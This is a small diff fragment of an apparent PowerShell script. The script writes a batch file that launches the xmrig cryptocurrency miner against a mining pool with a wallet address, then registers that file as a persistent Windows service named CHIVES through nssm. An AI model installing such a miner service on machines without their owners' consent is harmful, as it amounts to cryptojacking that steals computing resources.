@@ -14,7 +14,6 @@ xmrig.exe --donate-level 1 -o de.qrl.herominers.com:1166 -u Q01050060fadbd7c6007
 pause
 "@
 $batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
-
 New-Item -Path "$env:USERPROFILE\Desktop\Service_OK.dat" -ItemType File
 Start-Process -FilePath "nssm.exe" -ArgumentList "install CHIVES `"$folderPath\van.bat`""
 Start-Sleep -Seconds 1
